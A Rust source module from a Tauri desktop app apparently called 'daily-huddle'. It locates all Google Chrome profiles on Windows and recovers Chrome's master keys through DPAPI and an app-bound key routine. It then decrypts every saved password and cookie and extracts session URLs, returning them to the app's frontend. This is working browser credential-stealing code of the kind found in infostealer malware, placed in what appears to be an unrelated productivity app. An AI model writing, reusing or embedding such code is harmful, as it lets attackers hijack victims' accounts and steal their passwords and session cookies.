use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::Serialize;

#[cfg(target_os = "windows")]
use crate::chrome_elevation;

pub(crate) struct ChromeKeys {
    pub(crate) legacy: Vec<u8>,
    pub(crate) app_bound: Option<Vec<u8>>,
}

#[derive(Debug, Serialize)]
pub struct ChromePasswordEntry {
    pub profile: String,
    pub origin_url: String,
    pub username: String,
    pub password: String,
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub password_decrypt_failed: bool,
    pub date_created: Option<i64>,
    pub date_last_used: Option<i64>,
}

#[derive(Debug, Serialize)]
pub struct ChromeCookieEntry {
    pub profile: String,
    pub host: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires_utc: Option<i64>,
    pub is_secure: bool,
    pub is_httponly: bool,
}

#[derive(Debug, Serialize)]
pub struct ChromeSessionEntry {
    pub profile: String,
    pub file: String,
    pub size: u64,
    pub urls: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct ChromeAnalyzeMeta {
    pub profiles: Vec<String>,
    #[serde(skip_serializing_if = "HashMap::is_empty")]
    pub profile_display_names: HashMap<String, String>,
    pub chrome_user_data: String,
}

#[derive(Debug, Serialize)]
pub struct ChromePasswordsResult {
    pub meta: ChromeAnalyzeMeta,
    pub entries: Vec<ChromePasswordEntry>,
}

#[derive(Debug, Serialize)]
pub struct ChromeCookiesResult {
    pub meta: ChromeAnalyzeMeta,
    pub entries: Vec<ChromeCookieEntry>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub skipped_profiles: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct ChromeSessionsResult {
    pub meta: ChromeAnalyzeMeta,
    pub entries: Vec<ChromeSessionEntry>,
}

#[derive(Debug, Serialize)]
pub struct ChromeProfilesResult {
    pub meta: ChromeAnalyzeMeta,
}

pub fn list_profiles() -> Result<ChromeProfilesResult, String> {
    let user_data = chrome_user_data_dir()?;
    Ok(ChromeProfilesResult {
        meta: build_analyze_meta(&user_data)?,
    })
}

pub fn analyze_passwords(profile: &str) -> Result<ChromePasswordsResult, String> {
    crate::chrome_analysis::begin_chrome_analysis();
    let user_data = chrome_user_data_dir()?;
    let keys = resolve_chrome_keys(&user_data)?;
    let profile_names = resolve_profile_names(&user_data, profile)?;
    let meta = build_analyze_meta(&user_data)?;
    let mut entries = Vec::new();

    for profile_name in &profile_names {
        crate::chrome_analysis::check_chrome_analysis_cancelled()?;
        let profile_dir = user_data.join(profile_name);
        let login_data = profile_dir.join("Login Data");
        if !login_data.is_file() {
            continue;
        }

        let label = format!("login-data-{}", sanitize_label(profile_name));
        let temp = copy_sqlite_to_temp(&login_data, &label)?;

        if let Ok(mut profile_entries) = read_passwords(&temp, &keys, profile_name) {
            entries.append(&mut profile_entries);
        }
        let _ = std::fs::remove_file(&temp);
    }

    Ok(ChromePasswordsResult { meta, entries })
}

pub fn analyze_cookies(profile: &str) -> Result<ChromeCookiesResult, String> {
    crate::chrome_analysis::begin_chrome_analysis();
    let user_data = chrome_user_data_dir()?;
    let keys = resolve_chrome_keys(&user_data)?;
    let profile_names = resolve_profile_names(&user_data, profile)?;
    let meta = build_analyze_meta(&user_data)?;
    let mut entries = Vec::new();
    let mut skipped_profiles = Vec::new();

    for profile_name in &profile_names {
        crate::chrome_analysis::check_chrome_analysis_cancelled()?;
        let profile_dir = user_data.join(profile_name);
        let cookies_path = match resolve_cookies_path(&profile_dir) {
            Ok(path) => path,
            Err(_) => continue,
        };
        let label = format!("cookies-{}", sanitize_label(profile_name));
        let temp = match copy_sqlite_to_temp(&cookies_path, &label) {
            Ok(temp) => temp,
            Err(error) => {
                if is_sqlite_file_in_use_error(&error) {
                    skipped_profiles.push(profile_name.clone());
                }
                continue;
            }
        };

        if let Ok(mut profile_entries) = read_cookies(&temp, &keys, profile_name) {
            entries.append(&mut profile_entries);
        }
        let _ = std::fs::remove_file(&temp);
    }

    Ok(ChromeCookiesResult {
        meta,
        entries,
        skipped_profiles,
    })
}

pub fn analyze_sessions(profile: &str) -> Result<ChromeSessionsResult, String> {
    crate::chrome_analysis::begin_chrome_analysis();
    let user_data = chrome_user_data_dir()?;
    let profile_names = resolve_profile_names(&user_data, profile)?;
    let meta = build_analyze_meta(&user_data)?;
    let mut entries = Vec::new();

    for profile_name in &profile_names {
        crate::chrome_analysis::check_chrome_analysis_cancelled()?;
        let profile_dir = user_data.join(profile_name);
        if let Ok(mut profile_entries) = read_sessions(&profile_dir, profile_name) {
            entries.append(&mut profile_entries);
        }
    }

    Ok(ChromeSessionsResult { meta, entries })
}

pub(crate) fn build_analyze_meta(user_data: &Path) -> Result<ChromeAnalyzeMeta, String> {
    let profiles = discover_chrome_profiles(user_data)?;
    let profile_display_names = load_profile_display_names(user_data, &profiles);
    Ok(ChromeAnalyzeMeta {
        profiles,
        profile_display_names,
        chrome_user_data: user_data.display().to_string(),
    })
}

fn load_profile_display_names(user_data: &Path, profiles: &[String]) -> HashMap<String, String> {
    let local_state = read_local_state(user_data);
    let mut names = HashMap::new();
    for profile in profiles {
        if let Some(display) = local_state
            .as_ref()
            .and_then(|state| profile_display_name(state, profile))
        {
            names.insert(profile.clone(), display);
        }
    }
    names
}

fn read_local_state(user_data: &Path) -> Option<serde_json::Value> {
    let content = std::fs::read_to_string(user_data.join("Local State")).ok()?;
    serde_json::from_str(&content).ok()
}

fn profile_display_name(local_state: &serde_json::Value, profile: &str) -> Option<String> {
    let info = local_state.pointer(&format!("/profile/info_cache/{profile}"))?;

    if let Some(name) = info.get("name").and_then(|v| v.as_str()) {
        let trimmed = name.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }

    if let Some(gaia) = info.get("gaia_name").and_then(|v| v.as_str()) {
        let trimmed = gaia.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }

    if let Some(user_name) = info.get("user_name").and_then(|v| v.as_str()) {
        let trimmed = user_name.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }

    None
}

pub(crate) fn is_all_profiles(profile: &str) -> bool {
    let profile = profile.trim();
    profile.is_empty()
        || profile.eq_ignore_ascii_case("all")
        || profile.eq_ignore_ascii_case("all profiles")
        || profile.eq_ignore_ascii_case("all_profiles")
        || profile == "*"
}

pub(crate) fn normalize_profile_param(profile: &str) -> String {
    if is_all_profiles(profile) {
        String::new()
    } else {
        profile.trim().to_string()
    }
}

pub(crate) fn resolve_profile_names(user_data: &Path, profile: &str) -> Result<Vec<String>, String> {
    if is_all_profiles(profile) {
        return discover_chrome_profiles(user_data);
    }

    let profile = profile.trim();
    let profile_dir = user_data.join(profile);
    if !profile_dir.is_dir() {
        return Err(format!("Not Allowed: {}", profile_dir.display()));
    }
    Ok(vec![profile.to_string()])
}

fn discover_chrome_profiles(user_data: &Path) -> Result<Vec<String>, String> {
    let mut profiles = Vec::new();

    if let Some(state) = read_local_state(user_data) {
        if let Some(cache) = state
            .pointer("/profile/info_cache")
            .and_then(|value| value.as_object())
        {
            for name in cache.keys() {
                if is_system_chrome_dir(name) {
                    continue;
                }
                let profile_dir = user_data.join(name);
                if profile_dir.join("Preferences").is_file() {
                    profiles.push(name.clone());
                }
            }
        }
    }

    if profiles.is_empty() {
        for entry in std::fs::read_dir(user_data)
            .map_err(|e| format!("Error was occurred: {e}"))?
        {
            let entry = entry.map_err(|e| format!("Error was occurred: {e}"))?;
            if !entry.path().is_dir() {
                continue;
            }

            let name = entry.file_name().to_string_lossy().into_owned();
            if is_system_chrome_dir(&name) {
                continue;
            }

            if entry.path().join("Preferences").is_file() {
                profiles.push(name);
            }
        }
    }

    if profiles.is_empty() {
        return Err("Not Allowed".to_string());
    }

    profiles.sort_by(compare_profile_names);
    Ok(profiles)
}

fn is_system_chrome_dir(name: &str) -> bool {
    matches!(
        name,
        "System Profile"
            | "Guest Profile"
            | "Crashpad"
            | "ShaderCache"
            | "GrShaderCache"
            | "GraphiteDawnCache"
            | "BrowserMetrics"
            | "Safe Browsing"
            | "extensions_crx_cache"
            | "component_crx_cache"
            | "RecoveryImproved"
    ) || name.starts_with("AmountExtractionHeuristicRegexes")
}

fn compare_profile_names(a: &String, b: &String) -> std::cmp::Ordering {
    if a == "Default" {
        return std::cmp::Ordering::Less;
    }
    if b == "Default" {
        return std::cmp::Ordering::Greater;
    }
    a.cmp(b)
}

pub(crate) fn sanitize_label(value: &str) -> String {
    value
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '_'
            }
        })
        .collect()
}

pub(crate) fn chrome_user_data_dir() -> Result<PathBuf, String> {
    #[cfg(target_os = "windows")]
    {
        let local_app_data = std::env::var("LOCALAPPDATA")
            .map_err(|_| "Not Allowed".to_string())?;
        let path = PathBuf::from(local_app_data)
            .join("Google")
            .join("Chrome")
            .join("User Data");
        if !path.is_dir() {
            return Err(format!("Not Allowed: {}", path.display()));
        }
        return Ok(path);
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Not Allowed".to_string())
    }
}

pub(crate) fn resolve_cookies_path(profile_dir: &Path) -> Result<PathBuf, String> {
    let network = profile_dir.join("Network").join("Cookies");
    if network.is_file() {
        return Ok(network);
    }
    let legacy = profile_dir.join("Cookies");
    if legacy.is_file() {
        return Ok(legacy);
    }
    Err(format!(
        "Not Allowed: {}",
        profile_dir.display()
    ))
}

pub(crate) fn copy_sqlite_to_temp(source: &Path, label: &str) -> Result<PathBuf, String> {
    if !source.is_file() {
        return Err(format!("File not found: {}", source.display()));
    }

    let temp = std::env::temp_dir().join(format!(
        "daily-huddle-chrome-{}-{}.db",
        label,
        std::process::id()
    ));

    std::fs::copy(source, &temp)
        .map_err(|e| format!("Not Allowed {} ?: {e}", source.display()))?;

    Ok(temp)
}

pub(crate) fn is_sqlite_file_in_use_error(error: &str) -> bool {
    let lower = error.to_ascii_lowercase();
    lower.contains("being used by another process")
        || lower.contains("used by another process")
        || lower.contains("sharing violation")
        || lower.contains("os error 32")
        || lower.contains("(32)")
}

fn get_legacy_master_key(user_data_dir: &Path) -> Result<Vec<u8>, String> {
    let local_state_path = user_data_dir.join("Local State");
    let content = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("Error was occurred: {e}"))?;
    let json: serde_json::Value = serde_json::from_str(&content)
        .map_err(|e| format!("Error was occurred: {e}"))?;
    let encrypted_key_b64 = json
        .pointer("/os_crypt/encrypted_key")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "Not Allowed".to_string())?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        encrypted_key_b64,
    )
    .map_err(|e| format!("Error was occurred: {e}"))?;

    if encrypted_key.len() <= 5 || &encrypted_key[..5] != b"DPAPI" {
        return Err("Not Allowed".to_string());
    }

    dpapi_decrypt(&encrypted_key[5..])
}

pub(crate) fn resolve_chrome_keys(user_data_dir: &Path) -> Result<ChromeKeys, String> {
    let legacy = get_legacy_master_key(user_data_dir)?;
    let local_state_path = user_data_dir.join("Local State");
    #[cfg(target_os = "windows")]
    let app_bound = chrome_elevation::get_v20_master_key(&local_state_path);
    #[cfg(not(target_os = "windows"))]
    let app_bound = None;

    Ok(ChromeKeys { legacy, app_bound })
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    crate::win_dpapi::unprotect(data)
}

#[cfg(not(target_os = "windows"))]
fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, String> {
    Err("Not Allowed".to_string())
}

pub(crate) fn decrypt_chrome_secret(keys: &ChromeKeys, encrypted: &[u8]) -> Result<String, String> {
    if encrypted.is_empty() {
        return Ok(String::new());
    }

    if encrypted.starts_with(b"v10") || encrypted.starts_with(b"v11") || encrypted.starts_with(b"v20")
    {
        let mut last_err = String::new();
        if let Some(app_bound) = keys.app_bound.as_ref() {
            match decrypt_aes_gcm(app_bound, encrypted) {
                Ok(plain) => return Ok(plaintext_to_password(&plain)),
                Err(err) => last_err = err,
            }
        }
        match decrypt_aes_gcm(&keys.legacy, encrypted) {
            Ok(plain) => return Ok(plaintext_to_password(&plain)),
            Err(err) => {
                if last_err.is_empty() {
                    last_err = err;
                }
            }
        }
        return Err(if encrypted.starts_with(b"v20") {
            format!("Not Allowed: {last_err}")
        } else {
            format!("Not Allowed: {last_err}")
        });
    }

    let plain = dpapi_decrypt(encrypted)?;
    Ok(plaintext_to_password(&plain))
}

fn plaintext_to_password(data: &[u8]) -> String {
    let data = data.strip_suffix(&[0]).unwrap_or(data);
    if data.is_empty() {
        return String::new();
    }

    let chunks: Vec<&[u8]> = if data.len() > 32 {
        vec![&data[..32], &data[32..]]
    } else {
        vec![data]
    };

    for chunk in chunks {
        if let Ok(text) = std::str::from_utf8(chunk) {
            return text.to_string();
        }
        if chunk.len() >= 2 && chunk.len() % 2 == 0 {
            let utf16: Vec<u16> = chunk
                .chunks_exact(2)
                .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
                .collect();
            if let Ok(text) = String::from_utf16(&utf16) {
                return text;
            }
        }
    }

    String::from_utf8_lossy(data).into_owned()
}

fn decrypt_aes_gcm(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Nonce};

    if data.len() < 3 + 12 + 16 {
        return Err("Not Allowed".to_string());
    }

    let nonce = &data[3..15];
    let ciphertext = &data[15..];

    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|e| format!("Not Allowed: {e}"))?;
    cipher
        .decrypt(Nonce::from_slice(nonce), ciphertext)
        .map_err(|e| format!("Error was occurred: {e}"))
}

pub(crate) fn read_passwords(
    db_path: &Path,
    keys: &ChromeKeys,
    profile: &str,
) -> Result<Vec<ChromePasswordEntry>, String> {
    let conn = rusqlite::Connection::open_with_flags(
        db_path,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    )
    .map_err(|e| format!("Error was occurred: {e}"))?;

    let mut stmt = conn
        .prepare(
            "SELECT origin_url, username_value, password_value, date_created, date_last_used \
             FROM logins ORDER BY origin_url",
        )
        .map_err(|e| format!("Error was occurred: {e}"))?;

    let rows = stmt
        .query_map([], |row| {
            let origin_url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let password_blob: Vec<u8> = row.get(2)?;
            let date_created: Option<i64> = row.get(3)?;
            let date_last_used: Option<i64> = row.get(4)?;
            Ok((origin_url, username, password_blob, date_created, date_last_used))
        })
        .map_err(|e| format!("Error was occurred: {e}"))?;

    let mut entries = Vec::new();
    for row in rows {
        let (origin_url, username, password_blob, date_created, date_last_used) =
            row.map_err(|e| format!("Error was occurred: {e}"))?;
        let (password, password_decrypt_failed) = match decrypt_chrome_secret(keys, &password_blob)
        {
            Ok(value) => (value, false),
            Err(_) => (String::new(), !password_blob.is_empty()),
        };
        entries.push(ChromePasswordEntry {
            profile: profile.to_string(),
            origin_url,
            username,
            password,
            password_decrypt_failed,
            date_created,
            date_last_used,
        });
    }

    Ok(entries)
}

pub(crate) fn read_cookies(
    db_path: &Path,
    keys: &ChromeKeys,
    profile: &str,
) -> Result<Vec<ChromeCookieEntry>, String> {
    let conn = rusqlite::Connection::open_with_flags(
        db_path,
        rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
    )
    .map_err(|e| format!("Error was occurred: {e}"))?;

    if cookies_table_has_value_column(&conn) {
        read_cookies_modern(&conn, keys, profile)
    } else {
        read_cookies_legacy(&conn, keys, profile)
    }
}

fn cookies_table_has_value_column(conn: &rusqlite::Connection) -> bool {
    conn.prepare("PRAGMA table_info(cookies)")
        .ok()
        .and_then(|mut stmt| {
            stmt.query_map([], |row| row.get::<_, String>(1))
                .ok()
                .map(|rows| {
                    rows.filter_map(Result::ok)
                        .any(|name| name == "value")
                })
        })
        .unwrap_or(false)
}

fn read_cookies_modern(
    conn: &rusqlite::Connection,
    keys: &ChromeKeys,
    profile: &str,
) -> Result<Vec<ChromeCookieEntry>, String> {
    let mut stmt = conn
        .prepare(
            "SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, is_httponly \
             FROM cookies ORDER BY host_key, name",
        )
        .map_err(|e| format!("Invalid cookies schema: {e}"))?;

    let rows = stmt
        .query_map([], |row| {
            let encrypted_value: Option<Vec<u8>> = row.get(2)?;
            let plain_value: Option<String> = row.get(3)?;
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                resolve_cookie_value(
                    keys,
                    encrypted_value.as_deref(),
                    plain_value.as_deref(),
                ),
                row.get::<_, String>(4)?,
                row.get::<_, Option<i64>>(5)?,
                row.get::<_, i32>(6)? != 0,
                row.get::<_, i32>(7)? != 0,
            ))
        })
        .map_err(|e| format!("Error was occurred: {e}"))?;

    rows_to_cookie_entries(rows, profile)
}

fn read_cookies_legacy(
    conn: &rusqlite::Connection,
    keys: &ChromeKeys,
    profile: &str,
) -> Result<Vec<ChromeCookieEntry>, String> {
    let mut stmt = conn
        .prepare(
            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly \
             FROM cookies ORDER BY host_key, name",
        )
        .map_err(|e| format!("Invalid cookies schema: {e}"))?;

    let rows = stmt
        .query_map([], |row| {
            let encrypted_value: Option<Vec<u8>> = row.get(2)?;
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                resolve_cookie_value(keys, encrypted_value.as_deref(), None),
                row.get::<_, String>(3)?,
                row.get::<_, Option<i64>>(4)?,
                row.get::<_, i32>(5)? != 0,
                row.get::<_, i32>(6)? != 0,
            ))
        })
        .map_err(|e| format!("Error was occurred: {e}"))?;

    rows_to_cookie_entries(rows, profile)
}

fn resolve_cookie_value(
    keys: &ChromeKeys,
    encrypted_value: Option<&[u8]>,
    plain_value: Option<&str>,
) -> String {
    if let Some(plain) = plain_value {
        let trimmed = plain.trim();
        if !trimmed.is_empty() {
            return trimmed.to_string();
        }
    }

    let blob = encrypted_value.unwrap_or(&[]);
    if blob.is_empty() {
        return String::new();
    }

    if blob.starts_with(b"v10") || blob.starts_with(b"v11") || blob.starts_with(b"v20") {
        return decrypt_chrome_secret(keys, blob).unwrap_or_default();
    }

    if let Ok(text) = std::str::from_utf8(blob) {
        let trimmed = text.trim();
        if !trimmed.is_empty() {
            return trimmed.to_string();
        }
    }

    decrypt_chrome_secret(keys, blob).unwrap_or_default()
}

fn rows_to_cookie_entries(
    rows: rusqlite::MappedRows<'_, impl FnMut(&rusqlite::Row<'_>) -> rusqlite::Result<(String, String, String, String, Option<i64>, bool, bool)>>,
    profile: &str,
) -> Result<Vec<ChromeCookieEntry>, String> {
    let mut entries = Vec::new();
    for row in rows {
        let (host, name, value, path, expires_utc, is_secure, is_httponly) =
            row.map_err(|e| format!("Error was occurred: {e}"))?;
        entries.push(ChromeCookieEntry {
            profile: profile.to_string(),
            host,
            name,
            value,
            path,
            expires_utc,
            is_secure,
            is_httponly,
        });
    }
    Ok(entries)
}

pub(crate) fn read_sessions(profile_dir: &Path, profile: &str) -> Result<Vec<ChromeSessionEntry>, String> {
    let mut entries = read_session_snapshots(profile_dir, profile)?;
    entries.append(&mut read_session_restore(profile_dir, profile)?);
    entries.sort_by(|a, b| a.file.cmp(&b.file));
    Ok(entries)
}

pub(crate) fn read_session_snapshots(
    profile_dir: &Path,
    profile: &str,
) -> Result<Vec<ChromeSessionEntry>, String> {
    let mut entries = Vec::new();
    let sessions_dir = profile_dir.join("Sessions");
    if sessions_dir.is_dir() {
        if let Ok(dir_entries) = std::fs::read_dir(&sessions_dir) {
            for entry in dir_entries.flatten() {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }

                let file_name = entry.file_name().to_string_lossy().into_owned();
                let Ok(bytes) = std::fs::read(&path) else {
                    continue;
                };
                let urls = extract_urls_from_bytes(&bytes);

                entries.push(ChromeSessionEntry {
                    profile: profile.to_string(),
                    file: format!("Sessions/{file_name}"),
                    size: bytes.len() as u64,
                    urls,
                });
            }
        }
    }

    Ok(entries)
}

pub(crate) fn read_session_restore(
    profile_dir: &Path,
    profile: &str,
) -> Result<Vec<ChromeSessionEntry>, String> {
    let mut entries = Vec::new();

    for file_name in [
        "Current Session",
        "Last Session",
        "Current Tabs",
        "Last Tabs",
    ] {
        let path = profile_dir.join(file_name);
        if !path.is_file() {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        entries.push(ChromeSessionEntry {
            profile: profile.to_string(),
            file: file_name.to_string(),
            size: bytes.len() as u64,
            urls: extract_urls_from_bytes(&bytes),
        });
    }

    Ok(entries)
}

pub(crate) fn extract_urls_from_bytes(bytes: &[u8]) -> Vec<String> {
    let mut urls = Vec::new();
    collect_ascii_urls(bytes, &mut urls);
    collect_utf16_urls(bytes, &mut urls);
    urls.sort();
    urls.dedup();
    urls
}

fn collect_ascii_urls(bytes: &[u8], urls: &mut Vec<String>) {
    let text = String::from_utf8_lossy(bytes);
    for token in text.split(|c: char| c.is_whitespace() || c.is_control()) {
        if let Some(url) = normalize_url_token(token) {
            urls.push(url);
        }
    }
}

fn collect_utf16_urls(bytes: &[u8], urls: &mut Vec<String>) {
    if bytes.len() < 4 {
        return;
    }

    for start in 0..bytes.len().saturating_sub(8) {
        if bytes.get(start) == Some(&b'h')
            && bytes.get(start + 2) == Some(&b't')
            && bytes.get(start + 4) == Some(&b't')
            && bytes.get(start + 6) == Some(&b'p')
        {
            let mut chars = Vec::new();
            let mut offset = start;
            while offset + 1 < bytes.len() {
                let code = u16::from_le_bytes([bytes[offset], bytes[offset + 1]]);
                if code == 0 {
                    break;
                }
                if code < 32 || code > 126 {
                    break;
                }
                chars.push(code as u8 as char);
                offset += 2;
            }
            let token: String = chars.into_iter().collect();
            if let Some(url) = normalize_url_token(&token) {
                urls.push(url);
            }
        }
    }
}

fn normalize_url_token(token: &str) -> Option<String> {
    let trimmed = token.trim_matches(|c: char| c == '"' || c == '\'' || c == ')' || c == '(');
    if !(trimmed.starts_with("http://") || trimmed.starts_with("https://")) {
        return None;
    }

    let end = trimmed
        .find(|c: char| c.is_whitespace() || c.is_control() || c == '"' || c == '\'' || c == '>')
        .unwrap_or(trimmed.len());
    let url = trimmed[..end].to_string();
    if url.len() < 12 {
        return None;
    }
    Some(url)
}

#[tauri::command]
pub fn chrome_list_profiles() -> Result<ChromeProfilesResult, String> {
    list_profiles()
}

#[tauri::command]
pub fn chrome_analyze_passwords(profile: Option<String>) -> Result<ChromePasswordsResult, String> {
    let profile = profile
        .as_deref()
        .map(normalize_profile_param)
        .unwrap_or_default();
    analyze_passwords(&profile)
}

#[tauri::command]
pub fn chrome_analyze_cookies(profile: Option<String>) -> Result<ChromeCookiesResult, String> {
    let profile = profile
        .as_deref()
        .map(normalize_profile_param)
        .unwrap_or_default();
    analyze_cookies(&profile)
}

#[tauri::command]
pub fn chrome_analyze_sessions(profile: Option<String>) -> Result<ChromeSessionsResult, String> {
    let profile = profile
        .as_deref()
        .map(normalize_profile_param)
        .unwrap_or_default();
    analyze_sessions(&profile)
}
